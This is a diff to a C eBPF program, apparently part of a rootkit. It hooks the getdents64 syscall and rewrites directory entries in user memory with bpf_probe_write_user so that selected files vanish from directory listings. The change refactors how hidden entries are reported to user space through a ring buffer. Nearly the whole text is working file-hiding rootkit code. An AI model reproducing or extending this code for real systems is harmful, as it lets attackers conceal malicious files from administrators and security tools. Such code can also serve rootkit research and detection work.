@@ -10,6 +10,7 @@
 static void hide_first_entry(long unsigned int buff_addr,
     struct linux_dirent64 * dirp,
     unsigned short d_reclen);
+static void send_msg_through_rb(u64 inode, char * filename, size_t filename_size);
 
 char _license[] SEC("license") = "GPL";
 
@@ -175,41 +176,44 @@ static void hide_first_entry(long unsigned int buff_addr, struct linux_dirent64 
     struct linux_dirent64 * dirp_next = (struct linux_dirent64 *)(buff_addr + d_reclen);
 
     // Copy dirp_next to the current dirp field by field
-    u64 tmp_inode, tmp_d_off;
-    unsigned short tmp_reclean, next_reclean;
-    unsigned short tmp_type;
-    // Read all fields (except d_name)
-    bpf_probe_read_user(&tmp_inode, sizeof(tmp_inode), &dirp_next->d_ino);
-    bpf_probe_read_user(&tmp_d_off, sizeof(tmp_d_off), &dirp_next->d_off);
-    bpf_probe_read_user(&tmp_reclean, sizeof(tmp_reclean), &dirp_next->d_reclen);
-    bpf_probe_read_user(&tmp_type, sizeof(tmp_type), &dirp_next->d_type);
+
+    u64 inode, d_off;
+    unsigned short reclean, next_reclean;
+    unsigned short type;
+    char next_filename[MAX_FILENAME_LEN];
+    char filename[MAX_FILENAME_LEN];
+    // Read all fields
+    bpf_probe_read_user(&inode, sizeof(inode), &dirp_next->d_ino);
+    bpf_probe_read_user(&d_off, sizeof(d_off), &dirp_next->d_off);
+    bpf_probe_read_user(&reclean, sizeof(reclean), &dirp_next->d_reclen);
+    bpf_probe_read_user(&type, sizeof(type), &dirp_next->d_type);
+    bpf_probe_read_user(&next_filename, sizeof(next_filename), &dirp_next->d_name);
+    bpf_probe_read_user(&filename, sizeof(filename), &dirp->d_name);
 
     // Copy next dirent reclean for later use
-    next_reclean = tmp_reclean;
+    next_reclean = reclean;
     // Increase size of reclean to sum of first and second dirents
     // This is part of hiding mechanism
-    tmp_reclean += d_reclen;
+    reclean += d_reclen;
 
     // Rewrite all fields (except d_name)
-    bpf_probe_write_user(&dirp->d_ino, &tmp_inode, sizeof(tmp_inode));
-    bpf_probe_write_user(&dirp->d_off, &tmp_d_off, sizeof(tmp_d_off));
-    bpf_probe_write_user(&dirp->d_reclen, &tmp_reclean, sizeof(tmp_reclean));
-    bpf_probe_write_user(&dirp->d_type, &tmp_type, sizeof(tmp_type));
+    bpf_probe_write_user(&dirp->d_ino, &inode, sizeof(inode));
+    bpf_probe_write_user(&dirp->d_off, &d_off, sizeof(d_off));
+    bpf_probe_write_user(&dirp->d_reclen, &reclean, sizeof(reclean));
+    bpf_probe_write_user(&dirp->d_type, &type, sizeof(type));
 
     // Actual d_name size of dirp_next
     size_t name_size =  next_reclean - 2 - offsetof(struct linux_dirent, d_name);
-
-    // Read d_name
-    char tmp_filename[MAX_FILENAME_LEN];
-    bpf_probe_read_user(&tmp_filename, sizeof(tmp_filename), &dirp_next->d_name);
 
     // Rewrite d_name
     // Copy filename byte by byte, because ebpf won't allow to copy it once
     for (size_t j = 0; j < 32; j++) {
         if (j == name_size + 1)
             break;
-        bpf_probe_write_user(&dirp->d_name[j], &tmp_filename[j], sizeof(char));
+        bpf_probe_write_user(&dirp->d_name[j], &next_filename[j], sizeof(char));
     }
+
+    send_msg_through_rb(inode, filename, sizeof(filename));
 }
 
 SEC("tp/unused")
@@ -234,25 +238,13 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit * ctx) {
     short unsigned int d_reclen = 0;
     bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
 
-    // Send message to user space before overwrite
-    // Allocate a buffer for the ring buffer
-    struct event * data = bpf_ringbuf_reserve(&rb, sizeof(struct event), 0);
-    if (!data) {
-        return 0;
-    }
-
     // Geet data for message
     u64 inode = 0;
     char filename[MAX_FILENAME_LEN];
     bpf_probe_read_user(&inode, sizeof(inode), &dirp->d_ino);
     bpf_probe_read_user_str(&filename, sizeof(filename), &dirp->d_name);
-
-    // Copy the value to the ring buffer
-    data->inode = inode;
-    memcpy(data->filename, filename, sizeof(filename));
-
-    // Submit the data to the ring buffer
-    bpf_ringbuf_submit(data, 0);
+    // Send message
+    send_msg_through_rb(inode, filename, sizeof(filename));
 
     // Overwrite d_reclen
     short unsigned int reclen_new = reclen_prev + d_reclen;
@@ -263,6 +255,20 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit * ctx) {
     // Go back to the original call, to check if there is more to hide
     bpf_tail_call(ctx, &prog_array, PROG_01);
     return 0;
+}
+
+static void send_msg_through_rb(u64 inode, char * filename, size_t filename_size) {
+    struct event * data = bpf_ringbuf_reserve(&rb, sizeof(struct event), 0);
+    if (!data) {
+        return;
+    }
+
+    // Copy the value to the ring buffer
+    data->inode = inode;
+    memcpy(data->filename, filename, filename_size);
+
+    // Submit the data to the ring buffer
+    bpf_ringbuf_submit(data, 0);
 }
 
 SEC("lsm/file_open")
